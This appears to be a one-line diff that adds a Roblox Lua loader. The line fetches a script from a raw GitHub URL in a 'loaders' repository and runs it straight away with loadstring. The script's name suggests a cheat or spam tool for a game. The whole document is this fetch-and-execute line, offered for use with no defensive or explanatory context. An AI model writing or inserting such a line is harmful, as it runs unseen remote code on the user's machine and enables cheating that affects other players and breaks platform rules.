@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/pixel-lineage-spear-class-dragon-race-spam2-l9fq8iezkycvvh.lua"))()
